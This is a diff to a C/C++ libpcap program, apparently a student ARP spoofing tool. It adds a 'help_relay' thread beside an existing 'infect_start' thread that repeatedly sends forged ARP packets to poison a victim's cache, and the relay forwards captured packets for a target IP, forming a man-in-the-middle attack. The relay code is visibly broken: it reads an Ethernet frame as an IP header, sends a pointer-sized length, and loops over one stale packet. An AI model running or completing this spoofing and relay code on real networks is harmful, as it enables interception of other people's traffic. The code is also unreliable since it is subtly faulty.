@@ -38,7 +38,7 @@ typedef struct makearphdr
 
 void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b); //get mac addr from reply
 void infect_start(pcap_t *a,uint8_t b[]);
-
+void help_relay(pcap_t *a, const u_char *b,char *c);
 
 int main(int argc, char *argv[])
 {
@@ -145,7 +145,7 @@ int main(int argc, char *argv[])
         if(res==1)
         {
             make_t_mac(pkt_data,tm,argv[3]); // get reply data -> target mac //<-ho temp
-            break;
+            break;  //  <- fix del ho temp
         }
         else if(res==0)
         {
@@ -161,7 +161,7 @@ int main(int argc, char *argv[])
             printf("End of File\n");
         }
         else
-            break;  //<-fix at here
+            break;
     }
     pcap_close(ph);
 
@@ -211,7 +211,7 @@ int main(int argc, char *argv[])
             if(repl==1)
             {
                 make_t_mac(gate_data,gatemac,argv[2]); // get reply data -> target mac //<-ho temp
-               break;  //<-fix
+               break;   //  <- fix del ho temp
             }
             else if(repl==0)
             {
@@ -273,20 +273,36 @@ int main(int argc, char *argv[])
             return 0;
         }
         //---------------------------------------------------------------------------------------send relay
-                                                                   //<-start here
-        int s_vic;//send victim
+        int s_vic;//send victimss
         while((s_vic=pcap_next_ex(ph, &header, &pkt_data))>=0)
         {
-            
-        }
-
-
-
+            if(s_vic==1)
+            {
+                help_relay(ph,pkt_data,argv[2]);
+                 break;//  <- fix del ho temp
+            }
+            else if(s_vic==0)
+            {
+                 printf("Time out error\n");
+                 continue;
+            }
+            else if(s_vic==-1)
+            {
+                printf("ERROR\n");
+            }
+            else if(s_vic==-2)
+            {
+                printf("End of File\n");
+            }
+            else
+                break;  //<-fix at here
+        }                                        //<-start here
 
         //----------------------------------------------------------send infection
         std :: thread infect(&infect_start,ph,packet);
-        //here in relay;
+        std :: thread relay(help_relay,ph,pkt_data,argv[2]);
         infect.join();
+        relay.join();
 
 
 
@@ -318,5 +334,20 @@ void infect_start(pcap_t *a,uint8_t b[])
         pcap_sendpacket(a,(u_char*)b,42);
 
         sleep(3);//recover test
+    }
+}
+
+void help_relay(pcap_t *a, const u_char *b, char *c)
+{
+    while(a!=NULL)
+    {
+        struct iphdr *eh = (struct iphdr*)(b);
+        uint32_t packet_tip=eh->daddr;
+        uint32_t match_dip;
+        match_dip=inet_addr(c);
+        if(match_dip==packet_tip)
+        {
+            pcap_sendpacket(a,(u_char*)b,sizeof(a));
+        }
     }
 }
